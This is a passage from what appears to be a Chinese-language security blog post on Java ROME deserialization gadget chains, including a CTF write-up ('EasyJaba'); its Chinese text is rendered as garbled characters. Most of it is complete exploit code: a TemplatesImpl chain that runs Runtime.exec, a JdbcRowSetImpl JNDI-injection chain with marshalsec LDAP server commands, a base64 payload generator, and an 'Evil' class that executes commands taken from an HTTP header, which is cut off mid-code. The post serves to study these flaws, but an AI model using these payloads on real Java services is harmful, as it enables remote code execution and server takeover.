class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings(value = &quot;all&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BadAttributeValueExpExceptionGadget</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c1</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code = RunCommand(<span class="string">&quot;Calc&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        bytecodesField.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line"><span class="comment">//        templates.newTransformer();</span></span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class, templates);</span><br><span class="line"><span class="comment">//        toStringBean.toString();</span></span><br><span class="line"></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        setValue(badAttributeValueExpException,<span class="string">&quot;val&quot;</span>,toStringBean);</span><br><span class="line"></span><br><span class="line">        serialize(badAttributeValueExpException);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] RunCommand(String cmd) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Evil&quot;</span>);</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">            ctClass.setSuperclass(superClass);</span><br><span class="line">            <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ctClass.makeClassInitializer();</span><br><span class="line">            constructor.setBody(<span class="string">&quot; try &#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd +</span><br><span class="line">                    <span class="string">&quot;\&quot;);\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; &#125; catch (Exception ignored) &#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; &#125;&quot;</span>);</span><br><span class="line">            <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">            ctClass.defrost();</span><br><span class="line">            <span class="keyword">return</span> bytes;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getValue</span><span class="params">(Object obj, String name)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> field.get(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        os.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">oi</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> oi.readObject();</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> object.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(object,value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/image-20221116192350056.png" alt="image-20221116192350056"></p><h3 id="JdbcRowSetImplé“¾"><a href="#JdbcRowSetImplé“¾" class="headerlink" title="JdbcRowSetImplé“¾"></a>JdbcRowSetImplé“¾</h3><p><code>JdbcRowSetImpl</code>é“¾åˆ©ç”¨<code>JNDIæ³¨å…¥</code>æ‰€è¿›è¡Œæ”»å‡»ï¼Œæ¥æ›¿æ¢é“¾å°¾<code>TemplatesImpl.getOutputProperties()</code>æ‰€å¯¼è‡´çš„åŠ è½½æ¶æ„å­—èŠ‚ç </p><p>æ¼æ´ç‚¹ä¸º<code>JdbcRowSetImpl.getDatabaseMetaData()</code></p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/image-20221116192355535.png" alt="image-20221116192355535"></p><p>è°ƒç”¨äº†connect()</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/image-20221116192400315.png" alt="image-20221116192400315"></p><p>è°ƒç”¨lookup(),åé¢å°±æ˜¯ä¸ªJNDIæ³¨å…¥æ”»å‡»ï¼ŒåŠå…·ä½“åœ¨è¿™é‡Œå°±ä¸åšåˆ†æäº†</p><p><strong>poc</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.rowset.JdbcRowSetImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings(value = &quot;all&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JdbcRowSetImplGadget</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">JdbcRowSetImpl</span> <span class="variable">jdbcRowSet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JdbcRowSetImpl</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;ldap://localhost:2333/Calc&quot;</span>;</span><br><span class="line">        jdbcRowSet.setDataSourceName(url);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(JdbcRowSetImpl.class,jdbcRowSet);</span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class,toStringBean);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;(<span class="number">1</span>);</span><br><span class="line">        hashMap.put(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Object[] tables= (Object[]) getValue(hashMap,<span class="string">&quot;table&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">new_tables</span> <span class="operator">=</span> tables[<span class="number">0</span>];</span><br><span class="line">        setValue(new_tables,<span class="string">&quot;key&quot;</span>,equalsBean);</span><br><span class="line"></span><br><span class="line">        serialize(hashMap);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        os.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">oi</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> oi.readObject();</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getValue</span><span class="params">(Object obj, String name)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> field.get(obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¼€å¯ä¸€ä¸ªLDAPæœåŠ¡ï¼Œåˆ©ç”¨<a href="https://github.com/mbechler/marshalsec%EF%BC%8C%E6%94%BE%E7%BD%AE%E6%81%B6%E6%84%8F%E7%B1%BB">https://github.com/mbechler/marshalsecï¼Œæ”¾ç½®æ¶æ„ç±»</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 8000</span><br><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:8000/#Calc 2333</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/image-20221116192408002.png" alt="image-20221116192408002"></p><h2 id="å››ã€åºåˆ—åŒ–payloadç¼©å‡"><a href="#å››ã€åºåˆ—åŒ–payloadç¼©å‡" class="headerlink" title="å››ã€åºåˆ—åŒ–payloadç¼©å‡"></a>å››ã€åºåˆ—åŒ–payloadç¼©å‡</h2><p>ä¸“é—¨å†™äº†ä¸€ç¯‡æ–‡ç« ï¼Œç§»æ­¥</p><h2 id="é™‡åŸæˆ˜â€ç–«â€2021-EasyJaba"><a href="#é™‡åŸæˆ˜â€ç–«â€2021-EasyJaba" class="headerlink" title="[é™‡åŸæˆ˜â€ç–«â€2021]EasyJaba"></a>[é™‡åŸæˆ˜â€ç–«â€2021]EasyJaba</h2><p>IndexControlleré‡Œbanäº†ä¸€äº›ç±»ï¼Œè¿™é‡Œåç¼–è¯‘ä¸å‡ºæ¥</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/image-20221116192414589.png" alt="image-20221116192414589"></p><p>è¦ç”¨jadxæ‰èƒ½çœ‹åˆ°</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/image-20221116192419456.png" alt="image-20221116192419456"></p><p>çœ‹åˆ°ä¾èµ–ä¸­æœ‰<code>Rome 1.0</code>ï¼ŒåŒæ—¶è¿™é‡Œèƒ½è°ƒç”¨<code>toString()</code>,åº”è¯¥æ˜¯æ‰“romeé“¾æ— ç–‘äº†ï¼Œè¿™é‡Œbanäº†<code>HashMap</code>å’Œ<code>BadAttributeValueExpException</code>ï¼Œä½†è¿™ä¸¤ä¸ªç±»çš„ä½œç”¨æ˜¯åœ¨Gadgetä¸­è°ƒç”¨åˆ°é‚£ä¸ªtoString()æ–¹æ³•ï¼Œè€Œè¿™é‡Œå¯ä»¥ç›´æ¥è°ƒç”¨<code>toString()</code></p><p><strong>exp</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.b4bycoffee;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings(value = &quot;all&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c1</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\BadClass\\Evil.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        bytecodesField.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class, templates);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(toStringBean);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] bytes1 = byteArrayOutputStream.toByteArray();</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> Exp.base64Encode(bytes1);</span><br><span class="line">        System.out.println(s);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">base64Encode</span><span class="params">(<span class="type">byte</span>[] bytes)</span> &#123;</span><br><span class="line">        Base64.<span class="type">Encoder</span> <span class="variable">encoder</span> <span class="operator">=</span> Base64.getEncoder();</span><br><span class="line">        <span class="keyword">return</span> encoder.encodeToString(bytes);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç”±äºé¢˜ç›®ä¸å‡ºç½‘ï¼Œæ‰€ä»¥éœ€è¦å†™ä¸ªç‰¹æ®Šçš„æ¶æ„ç±»</p><p><strong>Evil</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Evil</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader().loadClass(<span class="string">&quot;org.springframework.web.context.request.RequestContextHolder&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">m</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;getRequestAttributes&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> m.invoke(<span class="literal">null</span>);</span><br><span class="line">        c = Thread.currentThread().getContextClassLoader().loadClass(<span class="string">&quot;org.springframework.web.context.request.ServletRequestAttributes&quot;</span>);</span><br><span class="line">        m = c.getMethod(<span class="string">&quot;getResponse&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">m1</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;getRequest&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">resp</span> <span class="operator">=</span> m.invoke(o);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">req</span> <span class="operator">=</span> m1.invoke(o); <span class="comment">// HttpServletRequest</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">getWriter</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader().loadClass(<span class="string">&quot;javax.servlet.ServletResponse&quot;</span>).getDeclaredMethod(<span class="string">&quot;getWriter&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">getHeader</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader().loadClass(<span class="string">&quot;javax.servlet.http.HttpServletRequest&quot;</span>).getDeclaredMethod(<span class="string">&quot;getHeader&quot;</span>,String.class);</span><br><span class="line">        getHeader.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        getWriter.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">writer</span> <span class="operator">=</span> getWriter.invoke(resp);</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> (String)getHeader.invoke(req, <span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        String[] commands = <span class="keyword">new</span> <span class="title class_">String</span>[<span class="number">3</span>];</span><br><span class="line">        <span class="type">String</span> <span class="variable">charsetName</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="string">&quot;window&quot;</span>) ? <span class="string">&quot;GBK&quot;</span>:<span class="string">&quot;UTF-8&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (System.getProperty(<span class="string">&quot;os.name&quot;</span>).toUpperCase().contains(<span class="string">&quot;WIN&quot;</span>)) &#123;</span><br><span class="line">            commands[<span class="number">0</span>] = <span class="string">&quot;cmd&quot;</span>;</span><br><span class="line">            commands[<span class="number">1</span>] = <span 